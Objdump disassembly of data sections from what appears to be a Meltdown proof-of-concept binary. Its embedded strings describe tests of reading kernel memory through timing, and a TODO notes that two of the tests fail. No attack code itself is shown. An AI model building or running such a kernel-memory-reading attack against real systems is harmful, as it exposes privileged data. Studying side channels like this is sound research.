    190f:	6f                   	outsl  %ds:(%rsi),(%dx)
    1910:	61                   	(bad)  
    1911:	64 20 66 75          	and    %ah,%fs:0x75(%rsi)
    1915:	6e                   	outsb  %ds:(%rsi),(%dx)
    1916:	63 74 69 6f          	movslq 0x6f(%rcx,%rbp,2),%esi
    191a:	6e                   	outsb  %ds:(%rsi),(%dx)
    191b:	61                   	(bad)  
    191c:	6c                   	insb   (%dx),%es:(%rdi)
    191d:	69 74 79 00 00 00 00 	imul   $0x0,0x0(%rcx,%rdi,2),%esi
    1924:	00 
    1925:	00 00                	add    %al,(%rax)
    1927:	00 4e 75             	add    %cl,0x75(%rsi)
    192a:	6d                   	insl   (%dx),%es:(%rdi)
    192b:	62                   	(bad)  
    192c:	65 72 20             	gs jb  194f <_IO_stdin_used+0xcf>
    192f:	31 3a                	xor    %edi,(%rdx)
    1931:	20 54 65 73          	and    %dl,0x73(%rbp,%riz,2)
    1935:	74 69                	je     19a0 <_IO_stdin_used+0x120>
    1937:	6e                   	outsb  %ds:(%rsi),(%dx)
    1938:	67 20 6b 65          	and    %ch,0x65(%ebx)
    193c:	72 6e                	jb     19ac <_IO_stdin_used+0x12c>
    193e:	65 6c                	gs insb (%dx),%es:(%rdi)
    1940:	20 61 63             	and    %ah,0x63(%rcx)
    1943:	63 65 73             	movslq 0x73(%rbp),%esp
    1946:	73 00                	jae    1948 <_IO_stdin_used+0xc8>
    1948:	4e 75 6d             	rex.WRX jne 19b8 <_IO_stdin_used+0x138>
    194b:	62                   	(bad)  
    194c:	65 72 20             	gs jb  196f <_IO_stdin_used+0xef>
    194f:	32 3a                	xor    (%rdx),%bh
    1951:	20 54 65 73          	and    %dl,0x73(%rbp,%riz,2)
    1955:	74 69                	je     19c0 <_IO_stdin_used+0x140>
    1957:	6e                   	outsb  %ds:(%rsi),(%dx)
    1958:	67 20 6d 65          	and    %ch,0x65(%ebp)
    195c:	6c                   	insb   (%dx),%es:(%rdi)
    195d:	74 64                	je     19c3 <_IO_stdin_used+0x143>
    195f:	6f                   	outsl  %ds:(%rsi),(%dx)
    1960:	77 6e                	ja     19d0 <_IO_stdin_used+0x150>
    1962:	20 77 69             	and    %dh,0x69(%rdi)
    1965:	74 68                	je     19cf <_IO_stdin_used+0x14f>
    1967:	6f                   	outsl  %ds:(%rsi),(%dx)
    1968:	75 74                	jne    19de <_IO_stdin_used+0x15e>
    196a:	20 6b 65             	and    %ch,0x65(%rbx)
    196d:	72 6e                	jb     19dd <_IO_stdin_used+0x15d>
    196f:	65 6c                	gs insb (%dx),%es:(%rdi)
    1971:	2c 20                	sub    $0x20,%al
    1973:	72 65                	jb     19da <_IO_stdin_used+0x15a>
    1975:	61                   	(bad)  
    1976:	64 69 6e 67 20 61 20 	imul   $0x73206120,%fs:0x67(%rsi),%ebp
    197d:	73 
    197e:	74 61                	je     19e1 <_IO_stdin_used+0x161>
    1980:	74 69                	je     19eb <_IO_stdin_used+0x16b>
    1982:	63 20                	movslq (%rax),%esp
    1984:	73 74                	jae    19fa <_IO_stdin_used+0x17a>
    1986:	72 69                	jb     19f1 <_IO_stdin_used+0x171>
    1988:	6e                   	outsb  %ds:(%rsi),(%dx)
    1989:	67 00 00             	add    %al,(%eax)
    198c:	00 00                	add    %al,(%rax)
    198e:	00 00                	add    %al,(%rax)
    1990:	4e 75 6d             	rex.WRX jne 1a00 <_IO_stdin_used+0x180>
    1993:	62                   	(bad)  
    1994:	65 72 20             	gs jb  19b7 <_IO_stdin_used+0x137>
    1997:	33 3a                	xor    (%rdx),%edi
    1999:	20 54 65 73          	and    %dl,0x73(%rbp,%riz,2)
    199d:	74 69                	je     1a08 <_IO_stdin_used+0x188>
    199f:	6e                   	outsb  %ds:(%rsi),(%dx)
    19a0:	67 20 6d 65          	and    %ch,0x65(%ebp)
    19a4:	6c                   	insb   (%dx),%es:(%rdi)
    19a5:	74 64                	je     1a0b <_IO_stdin_used+0x18b>
    19a7:	6f                   	outsl  %ds:(%rsi),(%dx)
    19a8:	77 6e                	ja     1a18 <_IO_stdin_used+0x198>
    19aa:	20 77 69             	and    %dh,0x69(%rdi)
    19ad:	74 68                	je     1a17 <_IO_stdin_used+0x197>
    19af:	20 6b 65             	and    %ch,0x65(%rbx)
    19b2:	72 6e                	jb     1a22 <_IO_stdin_used+0x1a2>
    19b4:	65 6c                	gs insb (%dx),%es:(%rdi)
    19b6:	2e 20 54 72 79       	and    %dl,%cs:0x79(%rdx,%rsi,2)
    19bb:	69 6e 67 20 74 6f 20 	imul   $0x206f7420,0x67(%rsi),%ebp
    19c2:	72 65                	jb     1a29 <_IO_stdin_used+0x1a9>
    19c4:	61                   	(bad)  
    19c5:	64 20 77 68          	and    %dh,%fs:0x68(%rdi)
    19c9:	6f                   	outsl  %ds:(%rsi),(%dx)
    19ca:	6c                   	insb   (%dx),%es:(%rdi)
    19cb:	65 20 6b 65          	and    %ch,%gs:0x65(%rbx)
    19cf:	72 6e                	jb     1a3f <_IO_stdin_used+0x1bf>
    19d1:	65 6c                	gs insb (%dx),%es:(%rdi)
    19d3:	2e 20 00             	and    %al,%cs:(%rax)
    19d6:	54                   	push   %rsp
    19d7:	4f                   	rex.WRXB
    19d8:	44                   	rex.R
    19d9:	4f 3a 20             	rex.WRXB cmp (%r8),%r12b
    19dc:	54                   	push   %rsp
    19dd:	65 73 74             	gs jae 1a54 <_IO_stdin_used+0x1d4>
    19e0:	20 31                	and    %dh,(%rcx)
    19e2:	20 61 6e             	and    %ah,0x6e(%rcx)
    19e5:	64 20 33             	and    %dh,%fs:(%rbx)
    19e8:	20 64 6f 6e          	and    %ah,0x6e(%rdi,%rbp,2)
    19ec:	27                   	(bad)  
    19ed:	74 20                	je     1a0f <_IO_stdin_used+0x18f>
    19ef:	77 6f                	ja     1a60 <_IO_stdin_used+0x1e0>
    19f1:	72 6b                	jb     1a5e <_IO_stdin_used+0x1de>
    19f3:	00 00                	add    %al,(%rax)
    19f5:	00 00                	add    %al,(%rax)
    19f7:	00 46 69             	add    %al,0x69(%rsi)
    19fa:	72 73                	jb     1a6f <_IO_stdin_used+0x1ef>
    19fc:	74 20                	je     1a1e <_IO_stdin_used+0x19e>
    19fe:	74 65                	je     1a65 <_IO_stdin_used+0x1e5>
    1a00:	73 74                	jae    1a76 <_IO_stdin_used+0x1f6>
    1a02:	2e 20 56 61          	and    %dl,%cs:0x61(%rsi)
    1a06:	6c                   	insb   (%dx),%es:(%rdi)
    1a07:	75 65                	jne    1a6e <_IO_stdin_used+0x1ee>
    1a09:	73 20                	jae    1a2b <_IO_stdin_used+0x1ab>
    1a0b:	73 68                	jae    1a75 <_IO_stdin_used+0x1f5>
    1a0d:	6f                   	outsl  %ds:(%rsi),(%dx)
    1a0e:	75 6c                	jne    1a7c <_IO_stdin_used+0x1fc>
    1a10:	64 20 62 65          	and    %ah,%fs:0x65(%rdx)
    1a14:	20 68 69             	and    %ch,0x69(%rax)
    1a17:	67 68 65 72 0a 00    	addr32 pushq $0xa7265
    1a1d:	00 00                	add    %al,(%rax)
    1a1f:	00 0a                	add    %cl,(%rdx)
    1a21:	0a 53 65             	or     0x65(%rbx),%dl
    1a24:	63 6f 6e             	movslq 0x6e(%rdi),%ebp
    1a27:	64 20 74 65 73       	and    %dh,%fs:0x73(%rbp,%riz,2)
    1a2c:	74 2e                	je     1a5c <_IO_stdin_used+0x1dc>
    1a2e:	20 56 61             	and    %dl,0x61(%rsi)
    1a31:	6c                   	insb   (%dx),%es:(%rdi)
    1a32:	75 65                	jne    1a99 <__GNU_EH_FRAME_HDR+0x1>
    1a34:	73 20                	jae    1a56 <_IO_stdin_used+0x1d6>
    1a36:	73 68                	jae    1aa0 <__GNU_EH_FRAME_HDR+0x8>
    1a38:	6f                   	outsl  %ds:(%rsi),(%dx)
    1a39:	75 6c                	jne    1aa7 <__GNU_EH_FRAME_HDR+0xf>
    1a3b:	64 20 62 65          	and    %ah,%fs:0x65(%rdx)
    1a3f:	20 6c 6f 77          	and    %ch,0x77(%rdi,%rbp,2)
    1a43:	65 72 0a             	gs jb  1a50 <_IO_stdin_used+0x1d0>
    1a46:	00 69 3a             	add    %ch,0x3a(%rcx)
    1a49:	20 25 64 09 64 65    	and    %ah,0x65640964(%rip)        # 656423b3 <_end+0x654402ab>
    1a4f:	6c                   	insb   (%dx),%es:(%rdi)
    1a50:	74 61                	je     1ab3 <__GNU_EH_FRAME_HDR+0x1b>
    1a52:	3a 25 6c 64 0a 00    	cmp    0xa646c(%rip),%ah        # a7ec4 <__FRAME_END__+0xa61a0>
    1a58:	6b 70 3a 25          	imul   $0x25,0x3a(%rax),%esi
    1a5c:	70 20                	jo     1a7e <_IO_stdin_used+0x1fe>
    1a5e:	09 20                	or     %esp,(%rax)
    1a60:	69 6e 64 65 78 3a 25 	imul   $0x253a7865,0x64(%rsi),%ebp
    1a67:	64 09 25 63 20 09 20 	or     %esp,%fs:0x20092063(%rip)        # 20093ad1 <_end+0x1fe919c9>
    1a6e:	74 69                	je     1ad9 <__GNU_EH_FRAME_HDR+0x41>
    1a70:	6d                   	insl   (%dx),%es:(%rdi)
    1a71:	65 3a 25 6c 64 0a 00 	cmp    %gs:0xa646c(%rip),%ah        # a7ee4 <__FRAME_END__+0xa61c0>
    1a78:	4c 61                	rex.WR (bad) 
    1a7a:	73 74                	jae    1af0 <__GNU_EH_FRAME_HDR+0x58>
    1a7c:	20 66 72             	and    %ah,0x72(%rsi)
    1a7f:	65 65 00 00          	gs add %al,%gs:(%rax)
    1a83:	00 00                	add    %al,(%rax)
    1a85:	00 00                	add    %al,(%rax)
	...

0000000000001a88 <__PRETTY_FUNCTION__.4260>:
    1a88:	67 65 74 5f          	addr32 gs je 1aeb <__GNU_EH_FRAME_HDR+0x53>
    1a8c:	70 68                	jo     1af6 <__GNU_EH_FRAME_HDR+0x5e>
    1a8e:	79 73                	jns    1b03 <__GNU_EH_FRAME_HDR+0x6b>
    1a90:	5f                   	pop    %rdi
    1a91:	61                   	(bad)  
    1a92:	64 64 72 00          	fs fs jb 1a96 <__PRETTY_FUNCTION__.4260+0xe>

Disassembly of section .eh_frame_hdr:

0000000000001a98 <__GNU_EH_FRAME_HDR>:
    1a98:	01 1b                	add    %ebx,(%rbx)
    1a9a:	03 3b                	add    (%rbx),%edi
    1a9c:	7c 00                	jl     1a9e <__GNU_EH_FRAME_HDR+0x6>
    1a9e:	00 00                	add    %al,(%rax)
    1aa0:	0e                   	(bad)  
    1aa1:	00 00                	add    %al,(%rax)
    1aa3:	00 f8                	add    %bh,%al
    1aa5:	ed                   	in     (%dx),%eax
    1aa6:	ff                   	(bad)  
    1aa7:	ff c8                	dec    %eax
    1aa9:	00 00                	add    %al,(%rax)
    1aab:	00 08                	add    %cl,(%rax)
    1aad:	ef                   	out    %eax,(%dx)
    1aae:	ff                   	(bad)  
    1aaf:	ff f0                	push   %rax
    1ab1:	00 00                	add    %al,(%rax)
    1ab3:	00 18                	add    %bl,(%rax)
    1ab5:	ef                   	out    %eax,(%dx)
    1ab6:	ff                   	(bad)  
    1ab7:	ff 98 00 00 00 22    	lcall  *0x22000000(%rax)
    1abd:	f0 ff                	lock (bad) 
    1abf:	ff 08                	decl   (%rax)
    1ac1:	01 00                	add    %eax,(%rax)
    1ac3:	00 28                	add    %ch,(%rax)
    1ac5:	f1                   	icebp  
    1ac6:	ff                   	(bad)  
    1ac7:	ff 28                	ljmp   *(%rax)
    1ac9:	01 00                	add    %eax,(%rax)
    1acb:	00 2a                	add    %ch,(%rdx)
    1acd:	f2 ff                	repnz (bad) 
    1acf:	ff 48 01             	decl   0x1(%rax)
    1ad2:	00 00                	add    %al,(%rax)
    1ad4:	a0 f2 ff ff 68 01 00 	movabs 0xd000000168fffff2,%al
    1adb:	00 d0 
    1add:	f2 ff                	repnz (bad) 
    1adf:	ff 84 01 00 00 08 f3 	incl   -0xcf80000(%rcx,%rax,1)
    1ae6:	ff                   	(bad)  
    1ae7:	ff a4 01 00 00 c6 f3 	jmpq   *-0xc3a0000(%rcx,%rax,1)
    1aee:	ff                   	(bad)  
    1aef:	ff c8                	dec    %eax
    1af1:	01 00                	add    %eax,(%rax)
    1af3:	00 1d f4 ff ff e8    	add    %bl,-0x1700000c(%rip)        # ffffffffe9001aed <_end+0xffffffffe8dff9e5>
    1af9:	01 00                	add    %eax,(%rax)
    1afb:	00 6c f4 ff          	add    %ch,-0x1(%rsp,%rsi,8)
    1aff:	ff 08                	decl   (%rax)
    1b01:	02 00                	add    (%rax),%al
    1b03:	00 68 fd             	add    %ch,-0x3(%rax)
    1b06:	ff                   	(bad)  
    1b07:	ff 30                	pushq  (%rax)
    1b09:	02 00                	add    (%rax),%al
    1b0b:	00 d8                	add    %bl,%al
    1b0d:	fd                   	std    
    1b0e:	ff                   	(bad)  
    1b0f:	ff                   	(bad)  
    1b10:	78 02                	js     1b14 <__GNU_EH_FRAME_HDR+0x7c>
	...

Disassembly of section .eh_frame:

0000000000001b18 <__FRAME_END__-0x20c>:
    1b18:	14 00                	adc    $0x0,%al
    1b1a:	00 00                	add    %al,(%rax)
    1b1c:	00 00                	add    %al,(%rax)
    1b1e:	00 00                	add    %al,(%rax)
    1b20:	01 7a 52             	add    %edi,0x52(%rdx)
    1b23:	00 01                	add    %al,(%rcx)
    1b25:	78 10                	js     1b37 <__GNU_EH_FRAME_HDR+0x9f>
    1b27:	01 1b                	add    %ebx,(%rbx)
    1b29:	0c 07                	or     $0x7,%al
    1b2b:	08 90 01 07 10 14    	or     %dl,0x14100701(%rax)
    1b31:	00 00                	add    %al,(%rax)
    1b33:	00 1c 00             	add    %bl,(%rax,%rax,1)
    1b36:	00 00                	add    %al,(%rax)
    1b38:	78 ee                	js     1b28 <__GNU_EH_FRAME_HDR+0x90>
    1b3a:	ff                   	(bad)  
    1b3b:	ff 2b                	ljmp   *(%rbx)
	...
    1b45:	00 00                	add    %al,(%rax)
    1b47:	00 14 00             	add    %dl,(%rax,%rax,1)
    1b4a:	00 00                	add    %al,(%rax)
    1b4c:	00 00                	add    %al,(%rax)
    1b4e:	00 00                	add    %al,(%rax)
    1b50:	01 7a 52             	add    %edi,0x52(%rdx)
    1b53:	00 01                	add    %al,(%rcx)
    1b55:	78 10                	js     1b67 <__GNU_EH_FRAME_HDR+0xcf>
    1b57:	01 1b                	add    %ebx,(%rbx)
    1b59:	0c 07                	or     $0x7,%al
    1b5b:	08 90 01 00 00 24    	or     %dl,0x24000001(%rax)
    1b61:	00 00                	add    %al,(%rax)
    1b63:	00 1c 00             	add    %bl,(%rax,%rax,1)
    1b66:	00 00                	add    %al,(%rax)
    1b68:	28 ed                	sub    %ch,%ch
    1b6a:	ff                   	(bad)  
    1b6b:	ff 10                	callq  *(%rax)
    1b6d:	01 00                	add    %eax,(%rax)
    1b6f:	00 00                	add    %al,(%rax)
    1b71:	0e                   	(bad)  
    1b72:	10 46 0e             	adc    %al,0xe(%rsi)
    1b75:	18 4a 0f             	sbb    %cl,0xf(%rdx)
    1b78:	0b 77 08             	or     0x8(%rdi),%esi
    1b7b:	80 00 3f             	addb   $0x3f,(%rax)
    1b7e:	1a 3b                	sbb    (%rbx),%bh
    1b80:	2a 33                	sub    (%rbx),%dh
    1b82:	24 22                	and    $0x22,%al
    1b84:	00 00                	add    %al,(%rax)
    1b86:	00 00                	add    %al,(%rax)
    1b88:	14 00                	adc    $0x0,%al
    1b8a:	00 00                	add    %al,(%rax)
    1b8c:	44 00 00             	add    %r8b,(%rax)
    1b8f:	00 10                	add    %dl,(%rax)
    1b91:	ee                   	out    %al,(%dx)
    1b92:	ff                   	(bad)  
    1b93:	ff 08                	decl   (%rax)
	...
    1b9d:	00 00                	add    %al,(%rax)
    1b9f:	00 1c 00             	add    %bl,(%rax,%rax,1)
    1ba2:	00 00                	add    %al,(%rax)
    1ba4:	5c                   	pop    %rsp
    1ba5:	00 00                	add    %al,(%rax)
    1ba7:	00 12                	add    %dl,(%rdx)
    1ba9:	ef                   	out    %eax,(%dx)
    1baa:	ff                   	(bad)  
    1bab:	ff 06                	incl   (%rsi)
    1bad:	01 00                	add    %eax,(%rax)
    1baf:	00 00                	add    %al,(%rax)
    1bb1:	41 0e                	rex.B (bad) 
    1bb3:	10 86 02 43 0d 06    	adc    %al,0x60d4302(%rsi)
    1bb9:	03 01                	add    (%rcx),%eax
    1bbb:	01 0c 07             	add    %ecx,(%rdi,%rax,1)
    1bbe:	08 00                	or     %al,(%rax)
    1bc0:	1c 00                	sbb    $0x0,%al
    1bc2:	00 00                	add    %al,(%rax)
    1bc4:	7c 00                	jl     1bc6 <__GNU_EH_FRAME_HDR+0x12e>
    1bc6:	00 00                	add    %al,(%rax)
    1bc8:	f8                   	clc    
    1bc9:	ef                   	out    %eax,(%dx)
    1bca:	ff                   	(bad)  
    1bcb:	ff 02                	incl   (%rdx)
    1bcd:	01 00                	add    %eax,(%rax)
    1bcf:	00 00                	add    %al,(%rax)
    1bd1:	41 0e                	rex.B (bad) 
    1bd3:	10 86 02 43 0d 06    	adc    %al,0x60d4302(%rsi)
    1bd9:	02 fd                	add    %ch,%bh
    1bdb:	0c 07                	or     $0x7,%al
    1bdd:	08 00                	or     %al,(%rax)
    1bdf:	00 1c 00             	add    %bl,(%rax,%rax,1)
    1be2:	00 00                	add    %al,(%rax)
    1be4:	9c                   	pushfq 
    1be5:	00 00                	add    %al,(%rax)
    1be7:	00 da                	add    %bl,%dl
    1be9:	f0 ff                	lock (bad) 
    1beb:	ff 76 00             	pushq  0x0(%rsi)
    1bee:	00 00                	add    %al,(%rax)
    1bf0:	00 41 0e             	add    %al,0xe(%rcx)
    1bf3:	10 86 02 43 0d 06    	adc    %al,0x60d4302(%rsi)
    1bf9:	02 71 0c             	add    0xc(%rcx),%dh
    1bfc:	07                   	(bad)  
    1bfd:	08 00                	or     %al,(%rax)
    1bff:	00 18                	add    %bl,(%rax)
    1c01:	00 00                	add    %al,(%rax)
    1c03:	00 bc 00 00 00 30 f1 	add    %bh,-0xed00000(%rax,%rax,1)
    1c0a:	ff                   	(bad)  
    1c0b:	ff 30                	pushq  (%rax)
    1c0d:	00 00                	add    %al,(%rax)
    1c0f:	00 00                	add    %al,(%rax)
    1c11:	41 0e                	rex.B (bad) 
    1c13:	10 86 02 43 0d 06    	adc    %al,0x60d4302(%rsi)
    1c19:	00 00                	add    %al,(%rax)
    1c1b:	00 1c 00             	add    %bl,(%rax,%rax,1)
    1c1e:	00 00                	add    %al,(%rax)
    1c20:	d8 00                	fadds  (%rax)
    1c22:	00 00                	add    %al,(%rax)
    1c24:	44 f1                	rex.R icebp 
    1c26:	ff                   	(bad)  
    1c27:	ff                   	(bad)  
    1c28:	38 00                	cmp    %al,(%rax)
    1c2a:	00 00                	add    %al,(%rax)
    1c2c:	00 41 0e             	add    %al,0xe(%rcx)
    1c2f:	10 86 02 43 0d 06    	adc    %al,0x60d4302(%rsi)
    1c35:	73 0c                	jae    1c43 <__GNU_EH_FRAME_HDR+0x1ab>
    1c37:	07                   	(bad)  
    1c38:	08 00                	or     %al,(%rax)
    1c3a:	00 00                	add    %al,(%rax)
    1c3c:	20 00                	and    %al,(%rax)
    1c3e:	00 00                	add    %al,(%rax)
    1c40:	f8                   	clc    
    1c41:	00 00                	add    %al,(%rax)
    1c43:	00 5c f1 ff          	add    %bl,-0x1(%rcx,%rsi,8)
    1c47:	ff                   	(bad)  
    1c48:	be 00 00 00 00       	mov    $0x0,%esi
    1c4d:	41 0e                	rex.B (bad) 
    1c4f:	10 86 02 43 0d 06    	adc    %al,0x60d4302(%rsi)
    1c55:	45 83 03 02          	rex.RB addl $0x2,(%r11)
    1c59:	b4 0c                	mov    $0xc,%ah
    1c5b:	07                   	(bad)  
    1c5c:	08 00                	or     %al,(%rax)
    1c5e:	00 00                	add    %al,(%rax)
    1c60:	1c 00                	sbb    $0x0,%al
    1c62:	00 00                	add    %al,(%rax)
    1c64:	1c 01                	sbb    $0x1,%al
    1c66:	00 00                	add    %al,(%rax)
    1c68:	f6 f1                	div    %cl
    1c6a:	ff                   	(bad)  
    1c6b:	ff 57 00             	callq  *0x0(%rdi)
    1c6e:	00 00                	add    %al,(%rax)
    1c70:	00 41 0e             	add    %al,0xe(%rcx)
    1c73:	10 86 02 43 0d 06    	adc    %al,0x60d4302(%rsi)
    1c79:	02 52 0c             	add    0xc(%rdx),%dl
    1c7c:	07                   	(bad)  
    1c7d:	08 00                	or     %al,(%rax)
    1c7f:	00 1c 00             	add    %bl,(%rax,%rax,1)
    1c82:	00 00                	add    %al,(%rax)
    1c84:	3c 01                	cmp    $0x1,%al
    1c86:	00 00                	add    %al,(%rax)
    1c88:	2d f2 ff ff 4f       	sub    $0x4ffffff2,%eax
    1c8d:	00 00                	add    %al,(%rax)
    1c8f:	00 00                	add    %al,(%rax)
    1c91:	41 0e                	rex.B (bad) 
    1c93:	10 86 02 43 0d 06    	adc    %al,0x60d4302(%rsi)
    1c99:	02 4a 0c             	add    0xc(%rdx),%cl
    1c9c:	07                   	(bad)  
    1c9d:	08 00                	or     %al,(%rax)
    1c9f:	00 24 00             	add    %ah,(%rax,%rax,1)
    1ca2:	00 00                	add    %al,(%rax)
    1ca4:	5c                   	pop    %rsp
    1ca5:	01 00                	add    %eax,(%rax)
    1ca7:	00 5c f2 ff          	add    %bl,-0x1(%rdx,%rsi,8)
    1cab:	ff                   	(bad)  
    1cac:	ed                   	in     (%dx),%eax
    1cad:	08 00                	or     %al,(%rax)
    1caf:	00 00                	add    %al,(%rax)
    1cb1:	41 0e                	rex.B (bad) 
    1cb3:	10 86 02 43 0d 06    	adc    %al,0x60d4302(%rsi)
    1cb9:	48 83 03 03          	addq   $0x3,(%rbx)
    1cbd:	e0 08                	loopne 1cc7 <__GNU_EH_FRAME_HDR+0x22f>
    1cbf:	0c 07                	or     $0x7,%al
    1cc1:	08 00                	or     %al,(%rax)
    1cc3:	00 00                	add    %al,(%rax)
    1cc5:	00 00                	add    %al,(%rax)
    1cc7:	00 44 00 00          	add    %al,0x0(%rax,%rax,1)
    1ccb:	00 84 01 00 00 30 fb 	add    %al,-0x4d00000(%rcx,%rax,1)
    1cd2:	ff                   	(bad)  
    1cd3:	ff 65 00             	jmpq   *0x0(%rbp)
    1cd6:	00 00                	add    %al,(%rax)
    1cd8:	00 42 0e             	add    %al,0xe(%rdx)
    1cdb:	10 8f 02 42 0e 18    	adc    %cl,0x180e4202(%rdi)
    1ce1:	8e 03                	mov    (%rbx),%es
    1ce3:	45 0e                	rex.RB (bad) 
    1ce5:	20 8d 04 42 0e 28    	and    %cl,0x280e4204(%rbp)
    1ceb:	8c 05 48 0e 30 86    	mov    %es,-0x79cff1b8(%rip)        # ffffffff86302b39 <_end+0xffffffff86100a31>
    1cf1:	06                   	(bad)  
    1cf2:	48 0e                	rex.W (bad) 
    1cf4:	38 83 07 4d 0e 40    	cmp    %al,0x400e4d07(%rbx)
    1cfa:	72 0e                	jb     1d0a <__GNU_EH_FRAME_HDR+0x272>
    1cfc:	38 41 0e             	cmp    %al,0xe(%rcx)
    1cff:	30 41 0e             	xor    %al,0xe(%rcx)
    1d02:	28 42 0e             	sub    %al,0xe(%rdx)
    1d05:	20 42 0e             	and    %al,0xe(%rdx)
    1d08:	18 42 0e             	sbb    %al,0xe(%rdx)
    1d0b:	10 42 0e             	adc    %al,0xe(%rdx)
    1d0e:	08 00                	or     %al,(%rax)
    1d10:	10 00                	adc    %al,(%rax)
    1d12:	00 00                	add    %al,(%rax)
    1d14:	cc                   	int3   
    1d15:	01 00                	add    %eax,(%rax)
    1d17:	00 58 fb             	add    %bl,-0x5(%rax)
    1d1a:	ff                   	(bad)  
    1d1b:	ff 02                	incl   (%rdx)
    1d1d:	00 00                	add    %al,(%rax)
    1d1f:	00 00                	add    %al,(%rax)
    1d21:	00 00                	add    %al,(%rax)
	...

0000000000001d24 <__FRAME_END__>:
    1d24:	00 00                	add    %al,(%rax)
	...

Disassembly of section .init_array:

0000000000201d40 <__frame_dummy_init_array_entry>:
  201d40:	b0 0a                	mov    $0xa,%al
  201d42:	00 00                	add    %al,(%rax)
  201d44:	00 00                	add    %al,(%rax)
	...

Disassembly of section .fini_array:

0000000000201d48 <__do_global_dtors_aux_fini_array_entry>:
  201d48:	70 0a                	jo     201d54 <_DYNAMIC+0x4>
  201d4a:	00 00                	add    %al,(%rax)
  201d4c:	00 00                	add    %al,(%rax)
	...

Disassembly of section .dynamic:

0000000000201d50 <_DYNAMIC>:
  201d50:	01 00                	add    %eax,(%rax)
  201d52:	00 00                	add    %al,(%rax)
  201d54:	00 00                	add    %al,(%rax)
  201d56:	00 00                	add    %al,(%rax)
  201d58:	01 00                	add    %eax,(%rax)
  201d5a:	00 00                	add    %al,(%rax)
  201d5c:	00 00                	add    %al,(%rax)
  201d5e:	00 00                	add    %al,(%rax)
  201d60:	0c 00                	or     $0x0,%al
  201d62:	00 00                	add    %al,(%rax)
  201d64:	00 00                	add    %al,(%rax)
  201d66:	00 00                	add    %al,(%rax)
  201d68:	78 08                	js     201d72 <_DYNAMIC+0x22>
  201d6a:	00 00                	add    %al,(%rax)
  201d6c:	00 00                	add    %al,(%rax)
  201d6e:	00 00                	add    %al,(%rax)
  201d70:	0d 00 00 00 00       	or     $0x0,%eax
  201d75:	00 00                	add    %al,(%rax)
  201d77:	00 74 18 00          	add    %dh,0x0(%rax,%rbx,1)
  201d7b:	00 00                	add    %al,(%rax)
  201d7d:	00 00                	add    %al,(%rax)
  201d7f:	00 19                	add    %bl,(%rcx)
  201d81:	00 00                	add    %al,(%rax)
  201d83:	00 00                	add    %al,(%rax)
  201d85:	00 00                	add    %al,(%rax)
  201d87:	00 40 1d             	add    %al,0x1d(%rax)
  201d8a:	20 00                	and    %al,(%rax)
  201d8c:	00 00                	add    %al,(%rax)
  201d8e:	00 00                	add    %al,(%rax)
  201d90:	1b 00                	sbb    (%rax),%eax
  201d92:	00 00                	add    %al,(%rax)
  201d94:	00 00                	add    %al,(%rax)
  201d96:	00 00                	add    %al,(%rax)
  201d98:	08 00                	or     %al,(%rax)
  201d9a:	00 00                	add    %al,(%rax)
  201d9c:	00 00                	add    %al,(%rax)
  201d9e:	00 00                	add    %al,(%rax)
  201da0:	1a 00                	sbb    (%rax),%al
  201da2:	00 00                	add    %al,(%rax)
  201da4:	00 00                	add    %al,(%rax)
  201da6:	00 00                	add    %al,(%rax)
  201da8:	48 1d 20 00 00 00    	sbb    $0x20,%rax
  201dae:	00 00                	add    %al,(%rax)
  201db0:	1c 00                	sbb    $0x0,%al
  201db2:	00 00                	add    %al,(%rax)
  201db4:	00 00                	add    %al,(%rax)
  201db6:	00 00                	add    %al,(%rax)
  201db8:	08 00                	or     %al,(%rax)
  201dba:	00 00                	add    %al,(%rax)
  201dbc:	00 00                	add    %al,(%rax)
  201dbe:	00 00                	add    %al,(%rax)
  201dc0:	f5                   	cmc    
  201dc1:	fe                   	(bad)  
  201dc2:	ff 6f 00             	ljmp   *0x0(%rdi)
  201dc5:	00 00                	add    %al,(%rax)
  201dc7:	00 98 02 00 00 00    	add    %bl,0x2(%rax)
  201dcd:	00 00                	add    %al,(%rax)
  201dcf:	00 05 00 00 00 00    	add    %al,0x0(%rip)        # 201dd5 <_DYNAMIC+0x85>
  201dd5:	00 00                	add    %al,(%rax)
  201dd7:	00 c8                	add    %cl,%al
  201dd9:	04 00                	add    $0x0,%al
  201ddb:	00 00                	add    %al,(%rax)
  201ddd:	00 00                	add    %al,(%rax)
  201ddf:	00 06                	add    %al,(%rsi)
  201de1:	00 00                	add    %al,(%rax)
  201de3:	00 00                	add    %al,(%rax)
  201de5:	00 00                	add    %al,(%rax)
  201de7:	00 b8 02 00 00 00    	add    %bh,0x2(%rax)
  201ded:	00 00                	add    %al,(%rax)
  201def:	00 0a                	add    %cl,(%rdx)
  201df1:	00 00                	add    %al,(%rax)
  201df3:	00 00                	add    %al,(%rax)
  201df5:	00 00                	add    %al,(%rax)
  201df7:	00 10                	add    %dl,(%rax)
  201df9:	01 00                	add    %eax,(%rax)
  201dfb:	00 00                	add    %al,(%rax)
  201dfd:	00 00                	add    %al,(%rax)
  201dff:	00 0b                	add    %cl,(%rbx)
  201e01:	00 00                	add    %al,(%rax)
  201e03:	00 00                	add    %al,(%rax)
  201e05:	00 00                	add    %al,(%rax)
  201e07:	00 18                	add    %bl,(%rax)
  201e09:	00 00                	add    %al,(%rax)
  201e0b:	00 00                	add    %al,(%rax)
  201e0d:	00 00                	add    %al,(%rax)
  201e0f:	00 15 00 00 00 00    	add    %dl,0x0(%rip)        # 201e15 <_DYNAMIC+0xc5>
	...
  201e1d:	00 00                	add    %al,(%rax)
  201e1f:	00 03                	add    %al,(%rbx)
  201e21:	00 00                	add    %al,(%rax)
  201e23:	00 00                	add    %al,(%rax)
  201e25:	00 00                	add    %al,(%rax)
  201e27:	00 40 1f             	add    %al,0x1f(%rax)
  201e2a:	20 00                	and    %al,(%rax)
  201e2c:	00 00                	add    %al,(%rax)
  201e2e:	00 00                	add    %al,(%rax)
  201e30:	02 00                	add    (%rax),%al
  201e32:	00 00                	add    %al,(%rax)
  201e34:	00 00                	add    %al,(%rax)
  201e36:	00 00                	add    %al,(%rax)
  201e38:	80 01 00             	addb   $0x0,(%rcx)
  201e3b:	00 00                	add    %al,(%rax)
  201e3d:	00 00                	add    %al,(%rax)
  201e3f:	00 14 00             	add    %dl,(%rax,%rax,1)
  201e42:	00 00                	add    %al,(%rax)
  201e44:	00 00                	add    %al,(%rax)
  201e46:	00 00                	add    %al,(%rax)
  201e48:	07                   	(bad)  
  201e49:	00 00                	add    %al,(%rax)
  201e4b:	00 00                	add    %al,(%rax)
  201e4d:	00 00                	add    %al,(%rax)
